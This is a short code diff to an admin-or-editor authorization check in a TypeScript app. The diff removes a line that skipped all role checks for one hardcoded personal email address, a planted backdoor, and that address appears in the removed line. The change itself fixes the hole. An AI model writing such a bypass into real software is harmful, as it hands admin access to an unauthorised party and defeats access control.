@@ -13,7 +13,6 @@ const CONTENT_TABLES = [
 const ROLES = ["admin", "editor", "partner", "broker", "influencer", "user"] as const;
 
 async function assertAdminOrEditor(context: { supabase: any; userId: string; claims?: any }, allowEditor = true) {
-  if (context.claims?.email?.toLowerCase() === "douglas288@gmail.com") return;
   const { data: isAdmin } = await context.supabase.rpc("has_role", {
     _user_id: context.userId,
     _role: "admin",
